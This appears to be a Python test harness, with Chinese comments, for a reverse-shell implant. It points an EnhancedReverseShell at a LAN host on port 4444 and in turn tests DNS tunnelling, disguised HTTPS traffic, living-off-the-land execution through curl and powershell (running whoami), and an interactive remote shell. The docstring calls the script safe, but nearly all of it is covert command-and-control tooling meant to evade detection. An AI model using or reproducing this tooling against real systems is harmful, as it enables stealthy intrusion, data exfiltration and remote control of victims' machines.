"""
安全测试脚本 - 不修改任何系统文件
自动依次测试：DNS隧道、DNS查询、HTTPS伪装、LOTL借壳、交互式Shell会话
"""
from ForTarget import EnhancedReverseShell, DNSConfig, HTTPIsConfig, LOTLConfig

MAC_IP = '192.168.1.211'

shell = EnhancedReverseShell(
    host=MAC_IP,
    port=4444,
    dns_config=DNSConfig(
        domain='test.local',
        resolver=MAC_IP,
        resolver_port=5353,
    ),
    https_config=HTTPIsConfig(
        endpoint='/inject',
        use_tls=False,
        verify_ssl=False,
    ),
    lotl_config=LOTLConfig(
        tools=['curl', 'powershell'],
    ),
)

def sep(title: str) -> None:
    print(f"\n{'='*40}")
    print(f"  {title}")
    print('='*40)

# 1. DNS 隧道发送
sep("1/5  DNS 隧道发送")
ok = shell.send_dns_tunnel("hello from test_safe")
print(f"[结果] {'成功' if ok else '失败'}")

# 2. DNS 查询
sep("2/5  DNS 查询")
result = shell.query_dns()
print(f"[DNS响应] {result}")

# 3. HTTPS 伪装请求
sep("3/5  HTTPS 伪装请求")
result = shell.camouflage_https("test_safe probe")
print(f"[HTTPS响应] {result}")

# 4. LOTL 借壳执行
sep("4/5  LOTL 借壳执行 whoami")
result = shell.run_lotl_command("whoami")
print(f"[LOTL输出] {result}")

# 5. 交互式 Shell（放最后，会阻塞直到 Ctrl+C）
sep("5/5  交互式 Shell 会话（Ctrl+C 退出）")
shell.shell_session()
